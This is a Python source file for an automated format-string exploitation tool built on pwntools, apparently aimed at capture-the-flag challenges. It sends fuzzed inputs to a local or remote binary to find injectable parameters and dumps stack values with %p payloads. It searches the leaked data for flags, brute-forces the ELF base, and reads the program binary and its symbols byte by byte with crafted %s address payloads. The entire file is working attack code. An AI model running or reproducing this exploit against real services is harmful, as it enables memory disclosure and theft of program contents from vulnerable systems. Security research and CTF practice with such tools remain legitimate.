from pwn import *
from time import *
from random import *
from string import *
from binascii import *

import re


class ffstr():
	# Full Format STRing exploitation
	
	def __init__(self):
		
		# Input/Output from/torwards tested the binary
		self.io 	= None
		
		# Reference for ELF property reading
		self.elf	= None
		
		# Store challenge location
		self.location 	= None
		
		# Connection data
		self.path 	= None
		self.ip		= None
		self.port	= None
		
		# Assess chall behavior
		self.behavior 	= None
		self.blind_behavor = None
		
		# 32 or 64 bites
		self.bits 	= None
		self.block_byte	= None
		
		# Stack
		self.stack	= None
		self.stack_arg	= None
		self.start	= None
		
		# Format string delimiters
		self.delimiters = None
		
		# Regular Expression Pattern
		self.re_HexaPattern 	= b'(0[xX][0-9a-fA-F]+)|(\(n.l?\))'
		self.re_FlagPattern  	= b"[a-zA-Z0-9]+\{\S+\}"
		self.re_ArgPattern	= b"%[0-9]+\$[a-zA-Z]{0,2}"
		
		# Dump binary
		self.dump_name = None
		
		
	def getArgs(self):
		# Get args from pwntools
		# python3 TBN BINARY=./examples/vault
		# python3 TBN BINARY=127.0.0.1:1337 -BITS=64
		
		if args["BINARY"].find(":") > -1 :
			self.location = "remote"
			self.ip, self.port = args["BINARY"].split(":")
		else:
			self.location = "local"
			self.path = args["BINARY"]
			
		if "ELF" in args.keys():
			self.elf  = ELF(args["ELF"])
			
		if "BITS" in args.keys():
			if args["BITS"] == "32":
				self.bits = 32
				self.block_byte = 4
			else:
				self.bits = 64
				self.block_byte = 8
		else:
				# By default
				self.bits = 64
				self.block_byte = 8
		
	def connect(self):
		# Connection to the chall
		if self.location == "local":
			self.io = process(self.path)
		else:
			self.io = remote(self.ip,self.port)
			
	def close(self):
		self.io.close()
		
	def locateFuzzed(self,data,fuzz):
		# locate fuzzed value and provide markers

		# For each fuzzed values
		for i,elt in enumerate(fuzz):
		
			# Check each line
			for line in data.split(b"\n"):
			
				# if fuzzed value is found	
				if line.find(elt)>0:
					# Left & Right
					pos = line.find(elt)
					self.delimiters = (line[:pos],line[pos+len(elt):])
		
	def mimic(self,sequence,payload,t_out=0.25,fake=b"a"):
		# Mimic the software behavior from observe behavior
		
		# Connect tubes
		self.connect()
	
		# Proposing fuzzed injection when recv in awaiting data
		n = 0
		while  n < len(sequence) and self.io.connected():
			if sequence[n] and len(payload) > 0:
				pl = payload.pop(0)
				self.io.sendline(pl)
			else:
				self.io.sendline(fake)
			n += 1

		# One liner for dumping all the received data
		data = self.io.recvall(timeout=t_out)

		return n,data
		
	def mentalist(self,nb_input=5,t_out=2):
	
		# Return a list of injectable parameters
		log.progress("You have called the mentalist ...")
		
		# Generate fuzzed string for injection E41aF
		fuzz = [ "".join(choices(hexdigits,k=5)).encode() for i in range(nb_input)]
		_fuzz = []
		_fuzz.extend(fuzz)
		
		# Get as much output as possible, send all fuzzed values
		n,data = self.mimic([True]*nb_input,_fuzz)
		
		# Assess reflected data
		self.blind_behavior = []
		for i,elt in enumerate(fuzz):
			if data.find(elt)>0:
				log.info("Parameter "+str(i+1)+" is reflected ")
				self.blind_behavior.append(True)
			elif i >= n:
				break
			else:
				self.blind_behavior.append(False)
				
		# Locate Fuzzed Value
		self.locateFuzzed(data,fuzz)
		
		# Set behavior as a sequence of succesfull reflected input
		log.success("Behavior defined ...")
		
		# checking injection by search hexa pattern is format string has succeede
		for i in range(len(self.blind_behavior)):
			_seq = [False] * len(self.blind_behavior)
			_seq[i] = True
			_payload = [b"%1$p"]
			n,data = self.mimic(_seq,_payload,fake=b"a")
			proof = re.findall(self.re_HexaPattern, data)
			if proof:
				self.blind_behavior[i] = True
			else:
				self.blind_behavior[i] = False
				
		# Final
		log.success("Behavior validated ...")
		print(self.blind_behavior)
		
		# close the connection
		self.close()
		
	def stackPayload(self,n,var,size=8,left="",right=""):
		# Return a stack read payload of constant size
		payload = left+"%"+str(n)+"$"+var+right+" "*size
		payload = payload[:size].encode()
		return payload
		
	
	def stackDump(self,nb_elt=100,t_out=2):
		# Dump the stack, maximum of nb_elt element
		
		# Store the stack
		self.stack	= []
		
		# Generate Payloads
		payload = [self.stackPayload(i+1,"p",8) for i in range(nb_elt)]

		# Monitoring payload consumption done in mimic
		while len(payload)>0:
			
			# Mimic behavior
			n,data = self.mimic(self.blind_behavior,payload,fake=b"a")
			
			# Find the hexa pattern
			m = re.findall(self.re_HexaPattern, data)
				
			# Extract hexadecimal number
			for elt in m:
				self.stack.append(b"".join(elt))
		
		log.info(str(len(self.stack))+" stack elements recovered")

		
	def stackAnalyze(self):
		
		## Stage 0 - Get a copy of self.stack
		_stack = []
		_stack.extend(self.stack)
		
		## Stage 1 - Locate useful info on the stack
		txt = b""
		for elt in _stack:
			try:
				# Keeping and padding hexadecimal 
				_ = elt[2:].zfill(8)
				# Values are reorder for human reading purpose
				txt += unhexlify(_)[::-1]
			except:
				# In case of error, or nil/null values
				txt += b"\x00"*self.block_byte
		
		# Showin Hexdump
		print(hexdump(txt))
			
		# Regex generic flag format
		flags = re.findall(self.re_FlagPattern, txt)
		if flags:
			for flag in flags:
				log.success(flag.decode())
		
		# Regex generic stack payload
		fmts = re.findall(self.re_ArgPattern, txt)
		if fmts:
			self.stack_arg = None
			for fmt in fmts:
				beg = fmt.find(b"%")
				end = fmt.find(b"$")
				self.stack_arg = int(fmt[beg+1:end])
				log.info("Stack Argument is in position "+str(self.stack_arg)+" ("+fmt.decode()+")")

	def unOffset(self,eip):
		# support function find the offset from the binary starts \x7fELF...
		
		# Provide testing offset
		offset = []
		
		# Threshold
		trd = 0x0fff
		
		# Bruteforce
		msk = 0x1000

		# Converting
		try:
			eip = int(eip,16)
		except:
			return offset
		
		# If guessed not to be an eip
		if eip > trd:
			# Get the base
			eip =  (eip & trd)
			# bruteforce value
			for i in range(16):
				offset.append(eip+i*msk)
		else:
			return offset
			
		return offset
			
	def asyncExchange(self,exploit,t_out=0.25,fake=b"a"):
		# Step by Step Exchange with binary for leaking and exploitation purpose
		# self.behavior counts exchanged step
		
		# Check if io has been instanciated
		if self.io is None:
			self.connect()
			# re-Initiate behavior
			self.behavior = 0
			
		# Check if io is connected
		if not self.io.connected():
			self.connect()
			# re-Initiate behavior
			self.behavior = 0
			
		# Send message accordingly
		if self.blind_behavior[self.behavior %  len(self.blind_behavior)]:
			self.io.sendline(exploit)
		else:
			self.io.sendline(fake)
			
		# Increase behavior, change conditions
		self.behavior += 1
		
		# Wait a limited time
		ti = time()
		data = b""
		## do go above timeout and is still connected
		while time()-ti < t_out and self.io.connected():
			try:
				data += self.io.recvline(timeout=t_out)
			except:
				# Cleaning
				data += self.io.recvall()
		
		# return finding
		return data
		
		
			
			
	def locateBinary(self):
		# Locate return_pointer, define offset and identify program header
		
		# Working on a stack copy
		if self.blind_behavior.count(True) < 2 :
			self.info("Cannot Leak ...")
			return
		
		# Storing start file offset
		self.start = []
		
		# Use previous acquired stack values for offset bruteforcing
		for i,st in enumerate(self.stack):
		
			# Generate a set of offset to be tested
			guessed = self.unOffset(st)
			
			# Guess each offset from "guessed" lisy
			for guess in guessed:
			
				# Leak an hexadecimal value
				leak = None
				while leak is None:
					data = self.asyncExchange(self.stackPayload(i+1,"p")) #
					regex = re.search(self.re_HexaPattern, data)
					if regex:
						leak = int(regex[0],16)
				log.info("Leak "+hex(leak)+" ... Offset "+hex(guess))
					
				# Set payload
				if self.bits == 32:
					pos_arg = self.stack_arg+2
					pl = self.stackPayload(pos_arg ,"s",size=8)+p32(leak - guess)
				else:
					pos_arg = self.stack_arg+1
					pl = self.stackPayload(pos_arg ,"s",size=8)+p64(leak - guess)
					
				# Get Data
				data = b""
				while not (data.find(self.delimiters[0]) > -1 and data.find(self.delimiters[1]) >-1):
					data = self.asyncExchange(pl)

				# ELF Header
				if data.find(b"\x7fELF") > -1:
					self.start = (i ,guess) 
					print(data)
					self.close()
					return

					
				# Close connexion
				if not all(self.blind_behavior):
					self.close()
			
			
		
	def dumpBinary(self):
		# Dump Binary
		
		# Binary
		binary = b""
		
		# Working on a stack copy
		if self.elf is not None:
			log.info("No need to dump the binary ...")
			return
		
		# Byte per Byte
		n = 0
		while n < 16*10:
			
			
			# Get location
			i , offset = self.start
			
			# Leak an hexadecimal value
			leak = None
			while leak is None:
				data = self.asyncExchange(self.stackPayload(i+1,"p")) #
				regex = re.search(self.re_HexaPattern, data)
				if regex:
					leak = int(regex[0],16)
			log.info("Leak "+hex(leak)+" ... Offset "+hex(offset))
					
			# Set payload
			if self.bits == 32:
				pos_arg = self.stack_arg+2+2
				pl = self.stackPayload(pos_arg,"s",size=8+4*2,left="d34d",right="b33f")+p32(leak - offset + n)
			else:
				pos_arg = self.stack_arg+1+2
				pl = self.stackPayload(pos_arg,"s",size=8+8*2,left="    d34d",right="b33f    ")+p64(leak - offset + n)
					
			# Get Data
			data = b""
			while not (data.find(self.delimiters[0]) > -1 and data.find(self.delimiters[1]) >-1):
				data = self.asyncExchange(pl)


			left = data.find(b"d34d")+len(b"d34d")
			right= data.find(b"b33f")
			
			# Extract data 
			if data.find(b"d34d")>-1 and data.find(b"b33f")>-1:
				dump =data[left:right]
				L = len(dump)
				if L != 0 and dump != b"(null)" and dump != b"(nil)":
					binary += dump[:1]
					n+= 1
				else:
					binary += b"\x00"
					n += 1
					
				print(dump)
				print(hexdump(binary))
				
			# Close connexion
			if not all(self.blind_behavior):
				self.close()

		# unique name for the dump binary
		self.dump_name = str(int(time()))
		with open(self.dump_name,"wb") as fp:
			fp.write(binary)
			
	def loadELF(self):
		# Load ELF as per pwntools methodology from dumped binary
		self.elf  = ELF(self.dump_name)
		
	def showSymbols(self):
		# Read binary symbols
		
		# Working on a stack copy
		if self.elf is None:
			log.info("No ELF as support ...")
			return
			
		# read each symbols
		for sym in self.elf.symbols.keys():
			
			# Get location
			i , offset = self.start
			
			# symbol addr
			addr = self.elf.symbols[sym]
			
			# Leak an hexadecimal value
			leak = None
			while leak is None:
				data = self.asyncExchange(self.stackPayload(i+1,"p")) #
				regex = re.search(self.re_HexaPattern, data)
				if regex:
					leak = int(regex[0],16)
					
			log.info("Leak "+hex(leak)+" ... Offset "+hex(offset)+" "+sym+" "+hex(addr))
					
			# address correction if no PIE
			if not self.elf.pie:
				addr -= leak-offset
				
			# Set payload
			if self.bits == 32:
				pos_arg = self.stack_arg+2+2
				pl = self.stackPayload(pos_arg,"s",size=8+4*2,left="d34d",right="b33f")+p32(leak - offset + addr)
			else:
				pos_arg = self.stack_arg+1+2
				pl = self.stackPayload(pos_arg,"s",size=8+8*2,left="    d34d",right="b33f    ")+p64(leak - offset + addr)
					
			# test is \n is present
			if pl.find(b"\n")>-1:
				continue
				
			# Get Data
			data = b""
			while not (data.find(self.delimiters[0]) > -1 and data.find(self.delimiters[1]) >-1):
				data = self.asyncExchange(pl)


			left = data.find(b"d34d")+len(b"d34d")
			right= data.find(b"b33f")
			
			# Extract data 
			if data.find(b"d34d")>-1 and data.find(b"b33f")>-1:
				dump =data[left:right]
				print(dump)

				
			# Close connexion
			if not all(self.blind_behavior):
				self.close()
				
if __name__ == "__main__":

	# ffstr instanciation
	exploit = ffstr()
	exploit.getArgs()
	exploit.mentalist(nb_input=10,t_out=0.25)
	exploit.stackDump(nb_elt=100,t_out=0.5)
	exploit.stackAnalyze()
	exploit.locateBinary()
	exploit.dumpBinary()
	exploit.showSymbols()
	
	print(exploit.__dict__)